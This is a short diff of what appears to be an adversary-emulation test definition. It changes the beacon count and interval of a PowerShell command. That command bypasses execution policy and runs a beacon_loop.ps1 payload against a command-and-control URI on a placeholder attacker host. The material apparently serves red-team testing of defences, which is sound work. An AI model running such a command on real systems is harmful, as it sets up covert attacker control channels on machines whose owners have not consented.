@@ -13,7 +13,7 @@
         command: |
           powershell.exe -NoP -ExecutionPolicy Bypass -File .\beacon_loop.ps1 `
             -C2Uri "http://#{attacker.host.ip}:8080" `
-            -BeaconCount 10 `
-            -BeaconInterval 30
+            -BeaconCount 5 `
+            -BeaconInterval 10
         payloads:
           - beacon_loop.ps1
